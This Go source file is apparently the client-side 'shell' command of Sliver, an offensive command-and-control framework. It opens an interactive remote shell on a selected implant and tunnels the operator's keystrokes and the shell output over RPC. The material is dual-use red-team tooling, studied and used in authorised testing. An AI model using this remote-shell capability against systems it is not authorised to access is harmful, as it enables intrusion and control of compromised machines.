package command

import (
	"fmt"
	"io"
	"log"
	"os"
	consts "sliver/client/constants"
	pb "sliver/protobuf/client"
	sliverpb "sliver/protobuf/sliver"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func shell(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	fmt.Printf(Info + "Opening shell channel with sliver ...\n")

	shellReq := &pb.ShellReq{SliverID: ActiveSliver.Sliver.ID}
	shellReqData, _ := proto.Marshal(shellReq)
	respCh := rpc(&pb.Envelope{
		Type: consts.ShellStr,
		Data: shellReqData,
	}, defaultTimeout)
	resp := <-respCh
	if resp.Error != "" {
		fmt.Printf(Warn+"Error: %s", resp.Error)
		return
	}

	openedShell := &sliverpb.ShellData{}
	proto.Unmarshal(resp.Data, openedShell)
	go func() {
		for envelope := range respCh {
			shellData := &sliverpb.ShellData{}
			proto.Unmarshal(envelope.Data, shellData)
			log.Printf("[write] stdout ShellID = %d", shellData.ID)
			os.Stdout.Write(shellData.Stdout)
		}
	}()

	readBuf := make([]byte, 16)
	for {
		n, err := os.Stdin.Read(readBuf)
		if err == io.EOF {
			return
		}
		data, err := proto.Marshal(&sliverpb.ShellData{
			ID:       openedShell.ID,
			Stdin:    readBuf[:n],
			SliverID: ActiveSliver.Sliver.ID,
		})
		log.Printf("[read] stdin tunnel to ShellID = %d", openedShell.ID)
		go rpc(&pb.Envelope{
			Type: consts.ShellDataStr,
			Data: data,
		}, defaultTimeout)
	}
}
